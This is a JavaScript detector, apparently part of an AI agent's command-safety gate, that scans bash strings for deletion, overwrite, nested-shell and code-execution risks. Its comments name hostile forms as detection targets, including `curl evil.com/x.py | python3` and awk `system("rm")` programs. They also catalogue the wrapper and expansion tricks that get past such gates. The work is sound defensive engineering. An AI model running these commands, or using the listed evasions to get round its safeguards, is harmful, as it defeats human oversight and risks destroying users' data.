/**
 * bashRiskParser.js — heuristic risk detection on bash command strings.
 *
 * This is NOT a real shell parser. It's a quote-aware scanner that
 * spots a fixed list of known-dangerous patterns. The goal is to
 * over-flag rather than under-flag — false positives turn into one
 * "Allow once" click, false negatives let destructive commands run
 * silently.
 *
 * Detected risk kinds (`r.kind`):
 *   'delete'         rm/rmdir/unlink, find -delete, find -exec rm,
 *                    git clean, python/node -c with delete primitives
 *   'reset_repo'     git reset --hard, git checkout --, git restore
 *   'truncate'       `truncate` command
 *   'overwrite'      `>` redirect, `&>` redirect, `tee FILE`, `dd of=`
 *   'append'         `>>` / `&>>` redirect (lower risk but still flagged)
 *   'in_place_edit'  sed -i, perl -i, awk -i inplace
 *   'move'           `mv` (destination might overwrite; source removed)
 *   'unknown'        couldn't parse confidently — caller defaults to high
 *
 * Confidence levels: 'high' | 'medium' | 'low'.
 *
 * Returned shape from parseBashRiskyOps():
 *   { risks: Array<{ kind, pattern, target?, confidence }>,
 *     unparseable: bool }
 *
 * The FileSafetyGate maps the risk array onto its own action policy:
 *   - 'delete' kind                 → hard refuse, redirect to fileDeleteTool
 *   - 'reset_repo' / 'overwrite' /  → user prompt
 *     'append' / 'truncate' /
 *     'in_place_edit' / 'move' /
 *     'unknown'
 */

const REDIRECT_OPS = ['&>>', '&>', '2>>', '2>', '>>', '>', '<<', '<', '|&'];

// Split a bash command string into top-level sub-commands. Respects
// single + double quotes so a separator inside quotes is preserved.
export function splitCommands(command) {
  return splitWithSeparators(command).map(s => s.text);
}

// Phase 2D follow-up #10 (Codex 🔴, 2026-05-04): same split as
// splitCommands but preserves the separator before each sub
// (`null` for first, otherwise `;` / `|` / `&` / `&&` / `||`). The
// pipe-fed interpreter detector needs this to distinguish
// `cat x | python` (pipe-fed code execution) from `ls; python`
// (sequenced commands; bare python with no pipe input is
// independently checked elsewhere).
function splitWithSeparators(command) {
  if (typeof command !== 'string' || !command.trim()) return [];
  const out = [];
  let cur = '';
  let i = 0;
  let inSingle = false;
  let inDouble = false;
  let escape = false;
  let lastSep = null;

  const flush = (sepFound) => {
    const t = cur.trim();
    if (t) out.push({ text: t, sepBefore: lastSep });
    cur = '';
    lastSep = sepFound;
  };

  while (i < command.length) {
    const ch = command[i];
    if (escape) { cur += ch; escape = false; i++; continue; }
    if (ch === '\\' && !inSingle) { cur += ch; escape = true; i++; continue; }
    if (ch === "'" && !inDouble) { inSingle = !inSingle; cur += ch; i++; continue; }
    if (ch === '"' && !inSingle) { inDouble = !inDouble; cur += ch; i++; continue; }
    if (!inSingle && !inDouble) {
      const two = command.slice(i, i + 2);
      if (two === '&&') { flush('&&'); i += 2; continue; }
      if (two === '||') { flush('||'); i += 2; continue; }
      // Phase 2D follow-up #12 (Codex 🔴, 2026-05-04): bash 4+ `|&`
      // is stderr+stdout pipe (equivalent to `2>&1 |`). Must match
      // BEFORE single-char `|` / `&` or it splits into two separators
      // and the downstream pipe-fed code_execution check sees
      // sepBefore='&' (not '|') and misses `cat x |& python`.
      // Normalize sepBefore to `|` so all `sepBefore === '|'` checks
      // (currently just pipe-fed interpreter) cover this form too.
      if (two === '|&') { flush('|'); i += 2; continue; }
      if (ch === ';' || ch === '|' || ch === '&') { flush(ch); i++; continue; }
    }
    cur += ch;
    i++;
  }
  flush(null);
  return out;
}

// Tokenize one sub-command. Returns an array of
// { kind: 'word' | 'redirect', text }. Quotes are stripped from word
// values so detection can match the inside content directly.
export function tokenize(subCommand) {
  if (typeof subCommand !== 'string' || !subCommand.trim()) return [];
  const tokens = [];
  let cur = '';
  let i = 0;
  let inSingle = false;
  let inDouble = false;
  let escape = false;
  let started = false; // track whether cur has accumulated anything

  const pushWord = () => {
    if (started) {
      tokens.push({ kind: 'word', text: cur });
      cur = '';
      started = false;
    }
  };

  while (i < subCommand.length) {
    const ch = subCommand[i];
    if (escape) { cur += ch; started = true; escape = false; i++; continue; }
    if (ch === '\\' && !inSingle) { escape = true; i++; continue; }
    if (ch === "'" && !inDouble) { inSingle = !inSingle; started = true; i++; continue; }
    if (ch === '"' && !inSingle) { inDouble = !inDouble; started = true; i++; continue; }
    if (!inSingle && !inDouble && /\s/.test(ch)) {
      pushWord(); i++; continue;
    }
    if (!inSingle && !inDouble) {
      const remain = subCommand.slice(i);
      const op = REDIRECT_OPS.find(o => remain.startsWith(o));
      if (op) {
        pushWord();
        tokens.push({ kind: 'redirect', text: op });
        i += op.length;
        continue;
      }
    }
    cur += ch;
    started = true;
    i++;
  }
  pushWord();
  return tokens;
}

// Detect unbalanced quotes — a coarse signal that our tokenizer's
// view diverges from a real shell's. Consumed by parseBashRiskyOps()
// to set `unparseable: true`.
export function hasUnbalancedQuotes(s) {
  let inSingle = false;
  let inDouble = false;
  let escape = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (escape) { escape = false; continue; }
    if (ch === '\\' && !inSingle) { escape = true; continue; }
    if (ch === "'" && !inDouble) { inSingle = !inSingle; continue; }
    if (ch === '"' && !inSingle) { inDouble = !inDouble; continue; }
  }
  return inSingle || inDouble;
}

// Skip leading `FOO=bar` env-var assignments so `FOO=1 rm baz` is
// parsed as `head=rm`, not `head=FOO=1`.
function skipEnvAssignments(tokens) {
  let i = 0;
  while (
    i < tokens.length &&
    tokens[i].kind === 'word' &&
    /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i].text)
  ) {
    i++;
  }
  return i;
}

// Phase 2D follow-up #14 self-review (Codex 🟡, 2026-05-04): skip
// the entire pre-command preamble — leading redirect+target pairs
// AND env-var assignments, in any order. bash accepts redirects
// anywhere on the line, including BEFORE the command head:
//   `< /tmp/x rm -rf foo`         → equivalent to `rm -rf foo < /tmp/x`
//   `> out.log FOO=1 awk '...'`   → equivalent to `FOO=1 awk '...' > out.log`
// Without this skip, riskifyTokens sees `<` or `>` as the head and
// every head-based detection (rm/find/git/sed-i/awk/sed/...) misses
// the real command. findWrappedCommand also gets confused — it
// treats the redirect TARGET (`/tmp/x`) as the wrapper-or-head
// candidate.
//
// The skip loops because redirects and env-assignments can interleave
// (`FOO=1 < /tmp/x cmd` / `< /tmp/x FOO=1 cmd` are both valid bash).
// Most redirect ops (>, >>, <, &>, &>>, 2>, 2>>) take a target word;
// `<<` heredoc takes a label-word too (treated the same way).
function skipPreamble(tokens) {
  let i = 0;
  let progressed = true;
  while (progressed && i < tokens.length) {
    progressed = false;
    if (tokens[i].kind === 'redirect') {
      i++;
      if (i < tokens.length && tokens[i].kind === 'word') i++;
      progressed = true;
      continue;
    }
    if (
      tokens[i].kind === 'word' &&
      /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i].text)
    ) {
      i++;
      progressed = true;
      continue;
    }
  }
  return i;
}

function riskifyTokens(tokens, sepBefore = null) {
  const risks = [];
  if (!tokens.length) return risks;

  // skipPreamble (round 14 self-review): handles BOTH leading
  // redirect+target pairs AND env-var assignments, so commands like
  // `< /tmp/x rm -rf foo` parse as head=rm not head=`<`.
  const headIdx = skipPreamble(tokens);
  const head = tokens[headIdx]?.text || '';
  const args = tokens
    .slice(headIdx + 1)
    .filter(t => t.kind === 'word')
    .map(t => t.text);

  // ── delete-class ───────────────────────────────────────────────────
  if (head === 'rm' || head === 'rmdir' || head === 'unlink') {
    risks.push({
      kind: 'delete',
      pattern: head,
      target: args[args.length - 1] || null,
      confidence: 'high',
    });
  }

  if (head === 'find') {
    if (args.includes('-delete')) {
      risks.push({ kind: 'delete', pattern: 'find -delete', confidence: 'high' });
    }
    const execIdx = args.findIndex(a => a === '-exec' || a === '-execdir');
    const execCmd = execIdx >= 0 ? args[execIdx + 1] : null;
    if (execCmd === 'rm' || execCmd === 'rmdir' || execCmd === 'unlink') {
      risks.push({
        kind: 'delete',
        pattern: `find ${args[execIdx]} ${execCmd}`,
        confidence: 'high',
      });
    }
  }

  if (head === 'git') {
    if (args[0] === 'clean') {
      risks.push({ kind: 'delete', pattern: 'git clean', confidence: 'high' });
    }
    if (args[0] === 'reset' && args.includes('--hard')) {
      risks.push({ kind: 'reset_repo', pattern: 'git reset --hard', confidence: 'high' });
    }
    // `git checkout -- <path>` discards local changes; `git checkout .`
    // is the legacy form of the same.
    if (
      args[0] === 'checkout' &&
      (args.includes('--') || args.includes('.'))
    ) {
      risks.push({ kind: 'reset_repo', pattern: 'git checkout --', confidence: 'medium' });
    }
    if (args[0] === 'restore' && args.some(a => /^--source/.test(a))) {
      risks.push({ kind: 'reset_repo', pattern: 'git restore --source', confidence: 'medium' });
    }
  }

  // ── truncate / `: > file` ──────────────────────────────────────────
  if (head === 'truncate') {
    risks.push({ kind: 'truncate', pattern: 'truncate', confidence: 'high' });
  }

  // ── in-place edit ─────────────────────────────────────────────────
  if (head === 'sed' && args.some(a => a === '-i' || /^-i[^-]/.test(a))) {
    risks.push({ kind: 'in_place_edit', pattern: 'sed -i', confidence: 'high' });
  }
  if (head === 'perl' && args.some(a => /^-i/.test(a))) {
    risks.push({ kind: 'in_place_edit', pattern: 'perl -i', confidence: 'high' });
  }
  if (head === 'awk') {
    const inplaceIdx = args.findIndex(a => a === '-i');
    if (inplaceIdx >= 0 && args[inplaceIdx + 1] === 'inplace') {
      risks.push({ kind: 'in_place_edit', pattern: 'awk -i inplace', confidence: 'high' });
    }
  }

  // ── tee / dd of= (overwrite) ───────────────────────────────────────
  if (head === 'tee') {
    const target = args.find(a => !a.startsWith('-')) || null;
    risks.push({ kind: 'overwrite', pattern: 'tee', target, confidence: 'high' });
  }
  if (head === 'dd') {
    const ofArg = args.find(a => /^of=/.test(a));
    if (ofArg) {
      risks.push({
        kind: 'overwrite',
        pattern: 'dd of=',
        target: ofArg.slice(3),
        confidence: 'high',
      });
    }
  }

  // ── mv (source removed; destination overwritten if present) ────────
  if (head === 'mv') {
    risks.push({
      kind: 'move',
      pattern: 'mv',
      target: args[args.length - 1] || null,
      confidence: 'medium',
    });
  }

  // ── interpreter scripts that delete ────────────────────────────────
  // Heuristic: head is a known interpreter, args contains `-c` (Python
  // / Ruby) or `-e` (Perl / Node) followed by code that mentions a
  // deletion primitive.
  const PY_INTERPRETERS = new Set(['python', 'python3', 'pypy', 'pypy3']);
  const PY_DEL_RE = /\b(os\.remove|os\.unlink|shutil\.rmtree|Path\([^)]*\)\.unlink)\b/;
  if (PY_INTERPRETERS.has(head)) {
    const cIdx = args.indexOf('-c');
    const code = cIdx >= 0 ? args[cIdx + 1] || '' : '';
    if (PY_DEL_RE.test(code)) {
      risks.push({ kind: 'delete', pattern: 'python -c <delete>', confidence: 'medium' });
    }
  }
  if (head === 'node' || head === 'nodejs') {
    const eIdx = args.indexOf('-e');
    const code = eIdx >= 0 ? args[eIdx + 1] || '' : '';
    if (/\b(unlinkSync|rmSync|rmdirSync|fs\.rm\b|fs\.promises\.rm)\b/.test(code)) {
      risks.push({ kind: 'delete', pattern: 'node -e <delete>', confidence: 'medium' });
    }
  }
  if (head === 'ruby') {
    const eIdx = args.indexOf('-e');
    const code = eIdx >= 0 ? args[eIdx + 1] || '' : '';
    if (/\b(File\.delete|FileUtils\.rm|FileUtils\.remove)\b/.test(code)) {
      risks.push({ kind: 'delete', pattern: 'ruby -e <delete>', confidence: 'medium' });
    }
  }
  if (head === 'perl') {
    const eIdx = args.indexOf('-e');
    const code = eIdx >= 0 ? args[eIdx + 1] || '' : '';
    if (/\bunlink\b/.test(code)) {
      risks.push({ kind: 'delete', pattern: 'perl -e <delete>', confidence: 'medium' });
    }
  }

  // ── shell redirects ────────────────────────────────────────────────
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'redirect') continue;
    const target = tokens[i + 1]?.text || null;
    if (t.text === '>' || t.text === '&>') {
      risks.push({ kind: 'overwrite', pattern: t.text, target, confidence: 'high' });
    } else if (t.text === '>>' || t.text === '&>>') {
      risks.push({ kind: 'append', pattern: t.text, target, confidence: 'medium' });
    } else if (t.text === '2>') {
      // stderr redirect — usually safe (writes a log); flag as 'overwrite'
      // with low confidence so the gate can decide whether to prompt.
      risks.push({ kind: 'overwrite', pattern: '2>', target, confidence: 'low' });
    }
  }

  // ── Phase 2D follow-up #8 (Codex 🔴, 2026-05-04): nested-shell
  // wrapper detection by token scan ───────────────────────────────────
  // Earlier rounds checked only `head === 'bash'/'sh'/...` + eval/
  // xargs at head. That missed every wrapper form Codex enumerated:
  //   /bin/bash -c '...'              (absolute path)
  //   env bash -c '...'               (env wrapper)
  //   command bash -c '...'           (shell builtin wrapper)
  //   sudo bash -c '...'              (privilege wrapper)
  //   nohup / time / nice / exec bash -c '...'   (process wrappers)
  //   xargs -I{} bash -c '...'        (argument wrapper)
  //   FOO=1 bash -c '...'             (env-assignment wrapper, head still picks bash but defensive)
  // Maintaining a wrapper allow/deny list is a Phase 2D round-5-style
  // dead end. Token-scan ALL words: any token whose basename is a
  // shell interpreter AND a later token is `-c` (or POSIX glued
  // `-c<command>`) → nested_shell. Also any token whose basename is
  // `eval` → nested_shell. Subsumes the previous head-based checks.
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'word') continue;
    const base = tokenBasename(t.text);
    if (base === 'eval') {
      risks.push({ kind: 'nested_shell', pattern: 'eval', confidence: 'high' });
      continue;
    }
    if (!SHELL_INTERPRETERS.has(base)) continue;
    for (let j = i + 1; j < tokens.length; j++) {
      const u = tokens[j];
      if (u.kind !== 'word') continue;
      if (isShellCmdFlag(u.text)) {
        risks.push({ kind: 'nested_shell', pattern: `${base} -c`, confidence: 'high' });
        break;
      }
    }
  }

  // Phase 2D follow-up #9 + #10 (Codex 🔴, 2026-05-04): expansion-
  // form wrapper detection. Token-scan above only catches LITERAL
  // shell/interpreter names; runtime shell expansion can substitute
  // a shell or interpreter at spawn time without ever writing the
  // literal token:
  //   $SHELL -c '...'           (variable expansion → bash -c)
  //   $PYTHON -c '...'          (variable expansion → python -c)
  //   ${SHELL} -c '...'         (parameter expansion)
  //   bash${EMPTY} -c '...'     (concatenation expansion)
  //   ba* -c '...'              (glob expansion in /bin)
  //   "$X" -c '...'             (double-quoted variable, expands)
  // Rule: hard-reject if any word token containing an expansion
  // metachar ($ / * / ? / [ / {) appears at an INDEX BEFORE an
  // inline-code-flag token. The "before flag" ordering distinguishes
  // wrapper expansion (the attack) from data-arg expansion
  // (`grep -c $FILE` / `wc -c $FILE` / `cut -c 5 $FILE` /
  // `tar -c $X` / `mkdir -p $DIR` / `cp -r $SRC $DST`), where the
  // flag is on the literal head and the expansion is downstream data.
  let firstExpansionIdx = -1;
  let firstCFlagIdx = -1;
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'word') continue;
    if (firstExpansionIdx === -1 && hasExpansionMetachar(t.text)) {
      firstExpansionIdx = i;
    }
    if (firstCFlagIdx === -1 && isInlineCodeFlag(t.text)) {
      firstCFlagIdx = i;
    }
  }
  if (firstExpansionIdx >= 0 && firstCFlagIdx >= 0 && firstExpansionIdx < firstCFlagIdx) {
    risks.push({
      kind: 'nested_shell',
      pattern: 'expansion before code-flag',
      confidence: 'high',
    });
  }

  // Phase 2D follow-up #10 (Codex 🔴, 2026-05-04): interpreter
  // inline-code execution. python / node / ruby / perl / php / lua /
  // expect / tclsh / R / Rscript / julia all accept code on the
  // command line via -c / -e / -r / --eval / --execute / --command
  // (set varies per interpreter; we union them). Token-scan: any
  // token whose basename is a known interpreter, followed at any
  // later index by an inline-code flag → code_execution. Catches
  // all wrapper forms automatically: /usr/bin/python3 -c ..., env
  // python -c ..., command python -c ..., sudo python -c ...,
  // xargs -I{} python -c ..., FOO=1 python -c ...
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'word') continue;
    if (!isScriptInterpreter(t.text)) continue;
    for (let j = i + 1; j < tokens.length; j++) {
      const u = tokens[j];
      if (u.kind !== 'word') continue;
      if (isInlineCodeFlag(u.text)) {
        risks.push({
          kind: 'code_execution',
          pattern: `${tokenBasename(t.text)} ${u.text === '-c' || u.text === '-e' ? u.text : 'code-flag'}`,
          confidence: 'high',
        });
        break;
      }
    }
  }

  // Phase 2D follow-up #13 (Codex 🔴, 2026-05-04): argv-rewriter
  // detection. GNU `env -S "bash -c 'rm x'"` (and the long form
  // `env --split-string="..."` / `env --split-string=...`) parses
  // its single string argument as a shebang-style argv list at
  // exec time. After our wrapper-skip helper steps over `env -S`,
  // the next token is a single quoted string the parser cannot
  // classify — so it falls through to `unknown` prompt and one
  // approve click runs whatever the string says. There is no safe
  // way to inspect the string short of a real shell tokenizer
  // applied recursively, so the entire `env -S` family is hard-
  // rejected as `argv_rewrite`. Same hard-reject contract as
  // nested_shell / code_execution.
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'word') continue;
    if (tokenBasename(t.text) !== 'env') continue;
    for (let j = i + 1; j < tokens.length; j++) {
      const u = tokens[j];
      if (u.kind !== 'word') continue;
      // env -S / -S<value> (POSIX glued) / --split-string /
      // --split-string=value
      if (u.text === '-S' || /^-S./.test(u.text) ||
          u.text === '--split-string' || u.text.startsWith('--split-string=')) {
        risks.push({
          kind: 'argv_rewrite',
          pattern: 'env -S',
          confidence: 'high',
        });
        break;
      }
      // First non-flag positional after env wrappers — stop scanning
      // (the env's own flags are over).
      if (!u.text.startsWith('-') && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(u.text)) break;
    }
  }

  // Phase 2D follow-up #10 + #11: heredoc-fed interpreter
  // (`python <<EOF\n<code>\nEOF`) and input-redirect-fed interpreter
  // (`python < script.py`) — the heredoc body / file content runs as
  // arbitrary code with the interpreter as the executor. Detect:
  // *effective* interpreter (post wrapper-skip) AND tokens contain
  // `<<` / `<` redirect. Catches `env python <<EOF` /
  // `/usr/bin/env python < /tmp/x` / `sudo -E python <<EOF` etc.
  const interpToken = effectiveInterpreterHead(tokens);
  if (interpToken) {
    for (const t of tokens) {
      if (t.kind === 'redirect' && (t.text === '<<' || t.text === '<')) {
        risks.push({
          kind: 'code_execution',
          pattern: `${tokenBasename(interpToken.text)} ${t.text === '<<' ? 'heredoc' : 'stdin redirect'}`,
          confidence: 'high',
        });
        break;
      }
    }
  }

  // Phase 2D follow-up #10 + #11: pipe-fed interpreter
  // (`cat script.py | python` / `curl evil.com/x.py | python3` /
  // `cat x | env python` / `cat x | command python` / `cat x |
  // sudo -u u python`). The piped data becomes the interpreter's
  // stdin program. Use effectiveInterpreterHead (wrapper-aware) so
  // env/command/sudo etc. don't bypass. Bare interpreter outside a
  // pipeline (`python` standalone) just hangs on stdin — covered
  // by removing bare `[]` from isVersionProbe in bashTool.js
  // follow-up #10.
  if (sepBefore === '|' && interpToken) {
    risks.push({
      kind: 'code_execution',
      pattern: `${tokenBasename(interpToken.text)} pipe-fed`,
      confidence: 'high',
    });
  }

  // Phase 2D follow-up #14 D-fix #3 (Codex 🔴, 2026-05-04 third
  // re-review): unified awk-family detection. Replaces the previous
  // head-aware + inline-flag-token-scan two-layer design that took
  // three rounds of Codex D before all wrapper bypass classes were
  // closed. Each iteration plugged one bypass and left others open:
  //
  //   round 14   — head-aware findWrappedCommand only (sudo/env/...)
  //                missed `xargs awk -e` because xargs ∉ COMMAND_
  //                WRAPPERS.
  //   D fix #1   — added hasInlineFlag for `-e<glued>` / `--source`,
  //                missed `xargs awk` (still only via findWrappedCommand).
  //   D fix #2   — added inline-flag token-scan, missed `xargs awk
  //                'PROG'` (positional inline program after wrapper).
  //   D fix #3   — this commit: ONE token-scan over the whole sub-
  //                command, with two helpers
  //                (awkIsInvocationContext + analyzeAwkArgv) that
  //                cover all three program-source classes:
  //                  · positional inline (`awk 'PROG'`)
  //                  · -e/--source inline (GNU)
  //                  · stdin/pipe/heredoc-fed (no -f)
  //                Plus an invocation-context guard to avoid flagging
  //                awk-as-data tokens (`echo awk`, `git commit -m awk`).
  //
  // analyzeAwkArgv: full awk argv semantics — handles `--` end-of-
  // options, file-source flags (-f/--file/-fX/--file=X), inline-source
  // flags (-e/--source/-eX/--source=X), value-takers (-F/-v/-W/-i)
  // including POSIX-glued forms, then finds the first non-flag
  // positional. Returns {hasFileFlag, hasInlineFlag, hasPositional}.
  // D fix #5 (Codex 🔴 round 5, 2026-05-04): nuclear option. Five
  // rounds of D evaluation proved that wrapper-aware context guards
  // (head-aware findWrappedCommand → token-scan + walkback → 2-step
  // walkback with COMMAND_WRAPPERS / POSITIONAL_VALUE_WRAPPERS) all
  // share the same structural defect: enumerated wrapper / wrapper-
  // flag chains never get fully covered because every wrapper has its
  // own value-taking flags (`timeout -s`, `flock -w`, `stdbuf -o`,
  // `ionice -c`, ...). Each round Codex finds another flag chain or
  // wrapper not in the list.
  //
  // Exit the enumerate game: drop awkIsInvocationContext entirely.
  // Any token whose basename matches awk-family + has any inline-form
  // (positional / -e / --source / pipe-fed / heredoc / stdin-redirect)
  // → hard-reject. No invocation-context filter.
  //
  // Trade-off: false-positive surface widens from "awk-as-data with
  // wrapper-shaped prev token" to "ANY command containing literal
  // 'awk'/'gawk'/etc. as a word + inline-form arg":
  //   - `echo awk -e foo`  → flagged (literal awk + -e<glued>)
  //   - `git commit -m awk -e hello` → flagged
  //   - `grep awk -e file` → flagged
  //   - `cat docs/awk-tutorial.md` → NOT flagged (filename has '/' so
  //     basename is 'awk-tutorial.md', not in the awk-family regex)
  //   - `find -name 'awk*'` → NOT flagged ('awk*' not awk basename)
  //   - `printf 'awk -e foo'` (single-quoted) → NOT flagged (1 token
  //     after tokenize)
  // Agent mitigation: quote the awk literal as part of a string
  // (`echo 'awk -e hello'`) — single-quoted = 1 token, no awk-family
  // basename match, not flagged. Same trade-off as round 8 nested_
  // shell token-scan accepting `echo bash -c hello` false positive.
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'word') continue;
    if (!isAwkBasename(t.text)) continue;
    const argTokens = tokens.slice(i + 1);
    const analysis = analyzeAwkArgv(argTokens);
    if (analysis.hasInlineFlag || (!analysis.hasFileFlag && analysis.hasPositional)) {
      risks.push({
        kind: 'code_execution',
        pattern: `${tokenBasename(t.text)} inline program`,
        confidence: 'high',
      });
      break;
    }
    if (!analysis.hasFileFlag && !analysis.hasInlineFlag && !analysis.hasPositional) {
      // Stdin-fed: heredoc / `<` redirect (anywhere in sub-command,
      // including preposed `< /tmp/x.awk awk`) / pipe-fed. Bare `awk
      // --version` / `gawk -V` (no inline, no file, no stdin) falls
      // through to default-deny prompt.
      const hasStdinRedirect = tokens.some(tk =>
        tk.kind === 'redirect' && (tk.text === '<<' || tk.text === '<')
      );
      const isPipeFed = sepBefore === '|';
      if (isPipeFed || hasStdinRedirect) {
        risks.push({
          kind: 'code_execution',
          pattern: `${tokenBasename(t.text)} ${isPipeFed ? 'pipe-fed' : 'stdin redirect'}`,
          confidence: 'high',
        });
        break;
      }
    }
  }

  // D fix #6 (Codex 🔴 round 6, 2026-05-04): expansion-form awk
  // basename. The token-scan above only matches LITERAL `awk` /
  // `gawk` / etc. tokens. Shell expansion at the head can resolve
  // to awk at runtime:
  //   `$AWK 'BEGIN{system("rm")}'`
  //   `${a}wk 'BEGIN{system("rm")}'`
  //   `${cmd[@]} 'BEGIN{system("rm")}'`
  //   `$EDITOR file.txt` (any expansion-head + positional)
  // Round 9 already covers `$SHELL -c PROG` via expansion-before-c
  // (extended in round 10 to inline-code-flag), but those checks
  // require a specific FLAG (`-c`/`-e`/`-r`/`-p`/`--eval`) right
  // after expansion. awk's primary inline form is a positional
  // program (no flag), so the existing check misses it.
  //
  // Detection: head position (after preamble) is an expansion AND
  // any later token is a non-flag positional → hard-reject.
  // Trade-off (continued nuclear over-flag): `$EDITOR file.txt` /
  // `$BROWSER url` / `$TERM args` etc. all flag. Agent mitigation:
  // use literal command name instead of envvar shorthand. Safe
  // direction (over-flag) preferred per 5-round D pattern.
  {
    const headIdx2 = skipPreamble(tokens);
    const headTok = tokens[headIdx2];
    if (headTok && headTok.kind === 'word' && hasExpansionMetachar(headTok.text)) {
      for (let j = headIdx2 + 1; j < tokens.length; j++) {
        const u = tokens[j];
        if (u.kind !== 'word') continue;
        const a = u.text;
        if (a === '--') continue;
        if (a.startsWith('-')) continue;
        if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(a)) continue;
        // First non-flag positional after expansion-head → potential
        // inline program (head could expand to awk/python/sed/etc.).
        risks.push({
          kind: 'code_execution',
          pattern: 'expansion-head + positional program',
          confidence: 'medium',
        });
        break;
      }
    }
  }

  // gsed = GNU sed on BSD systems via homebrew; same e-cmd surface.
  const sedToken = findWrappedCommand(tokens, text => /^g?sed$/.test(tokenBasename(text)));
  if (sedToken) {
    const sedIdx = tokens.indexOf(sedToken);
    const wordArgs = tokens.slice(sedIdx + 1).filter(t => t.kind === 'word').map(t => t.text);
    // Scan ALL non-flag args (positional script + `-e <expr>`
    // values + `--expression=<expr>` content). False-positive cost:
    // an input filename that happens to match the e-cmd regex —
    // extremely unlikely (filenames rarely contain `s/.../.../e`
    // syntax or bare-e-then-whitespace).
    const hasEcmd = wordArgs.some(a => sedExpressionHasEcmd(a));
    if (hasEcmd) {
      risks.push({
        kind: 'code_execution',
        pattern: `${tokenBasename(sedToken.text)} e-cmd`,
        confidence: 'high',
      });
    }
  }

  return risks;
}

// Phase 2D follow-up #9: shell expansion metacharacters that, in
// command position, can substitute an arbitrary executable at
// spawn time. `$` covers `$VAR` / `${VAR}` / `$(cmd)` (the latter
// is also caught by hasShellSubstitution at parse-entry, but
// belt-and-suspenders). `*` / `?` / `[` are pathname glob;
// `{` is brace expansion (`{a,b}` / `bash{,sh}`).
function hasExpansionMetachar(text) {
  return /[\$\*\?\[\{]/.test(text);
}

// Phase 2D follow-up #8: which interpreter names trigger the nested-
// shell hard-reject when paired with `-c`. Includes POSIX-ish shells
// + zsh/fish. Does NOT include `busybox` (it is an applet multiplexer
// — its sh/ash applets are caught by basename of the inner argument
// in nested forms like `busybox sh -c '...'`).
const SHELL_INTERPRETERS = new Set([
  'bash', 'sh', 'zsh', 'dash', 'ksh', 'ash', 'mksh', 'fish',
]);

function tokenBasename(text) {
  if (typeof text !== 'string' || !text) return '';
  const idx = text.lastIndexOf('/');
  return idx >= 0 ? text.slice(idx + 1) : text;
}

// `-c` (separate arg) or POSIX bash glued form `-c<command>`. Glued
// `-cfoo` runs "foo" as the inner command — equally dangerous. Long
// options like `-config` would also match, but no shell takes them
// (false-positive cost is acceptable; the safe failure mode is hard
// reject of an exotic form).
function isShellCmdFlag(text) {
  return text === '-c' || /^-c./.test(text);
}

// Phase 2D follow-up #11 (Codex 🔴, 2026-05-04): bounded set of
// process wrappers that take a *command* as their first non-flag
// positional argument. Used by effectiveInterpreterHead() so all
// four code_execution detection paths (inline-code / heredoc /
// stdin-redirect / pipe-fed) recognize wrapped interpreter
// invocations the same way. Set is BOUNDED (POSIX/Linux-standard
// process wrappers + sudo-family + namespace tools + niceness
// controllers); unlike the round-5 git deny-list, these don't grow
// per release.
const COMMAND_WRAPPERS = new Set([
  // sudo / privilege wrappers
  'sudo', 'doas', 'gosu', 'su', 'runuser',
  // env-style passthrough
  'env', 'command',
  // niceness / scheduling
  'nice', 'nohup', 'time', 'exec',
  'ionice', 'taskset', 'chrt',
  // namespace / sandboxing
  'setsid', 'unshare', 'chroot', 'systemd-run', 'capsh',
  // D fix #4 (Codex 🔴, 2026-05-04 round 4): command-running wrappers
  // that take a sub-command as their positional payload. Each found by
  // Codex re-review of D fix #3:
  //   parallel  — `parallel awk 'PROG' ::: x` (GNU parallel)
  //   stdbuf    — `stdbuf -oL awk 'PROG'` (output buffering control)
  //   unbuffer  — `unbuffer awk 'PROG'` (Expect's unbuffer wrapper)
  //   watch     — `watch awk 'PROG'` (re-run on interval)
  // Defensive additions in the same family (not Codex-flagged but
  // structurally identical — all "exec sub-command after own flags"):
  //   entr      — file-watch executor (`ls *.txt | entr awk 'PROG'`)
  //   flock     — file-lock executor (`flock /tmp/f awk 'PROG'`)
  //   pv        — pipeline progress (`pv data | awk` — but as wrapper:
  //               `pv awk 'PROG'` is unusual; defensive)
  //   script    — terminal session record (`script -c "awk PROG"`)
  //   rlwrap    — readline wrapper (`rlwrap awk 'PROG'`)
  //   direnv    — only as `direnv exec . awk 'PROG'` form; conservative
  //   busybox   — applet multiplexer (`busybox awk 'PROG'`)
  //   timeout   — kill after N seconds (`timeout 5 awk 'PROG'`)
  //   strace    — syscall tracer (`strace awk 'PROG'`)
  //   ltrace    — library call tracer
  //   valgrind  — memory checker (`valgrind awk 'PROG'`)
  //   perf      — `perf stat awk 'PROG'`
  //   tsp/ts    — task-spooler (`tsp awk 'PROG'`)
  // Trade-off: this list is enumerated and might miss yet another
  // wrapper. Round-5 git deny-list went infinite; this list stays
  // bounded (POSIX/Linux command-running wrappers ~30 known). If a
  // round-N D finds another, add it.
  'parallel', 'stdbuf', 'unbuffer', 'watch',
  'entr', 'flock', 'pv', 'script', 'rlwrap', 'direnv',
  'busybox', 'timeout', 'strace', 'ltrace', 'valgrind', 'perf',
  'tsp', 'ts',
]);

// Most wrappers either take no flags, take only short bool flags
// (sudo -i / sudo -E / nohup), or take a flag with a value (sudo -u
// USER / env -u VAR / nice -n N / chrt -p PRIO / unshare --pid).
// We don't enumerate every flag's arity; instead skip any token
// starting with `-` and additionally skip ONE following value if the
// flag is a known value-taker. False-positive cost: occasionally we
// over-skip and miss a real interpreter; the next `-c` flag would
// still trigger the inline-code path, so the worst case is a
// pipe-fed/heredoc/redirect bypass that the inline-code path catches
// anyway.
const VALUE_TAKING_WRAPPER_FLAGS = new Set([
  '-u', '--user', '--unset',
  '-n', '--nice', '--niceness',
  '-g', '--gid', '-U', '--user-name',
  '-p', '--pid',
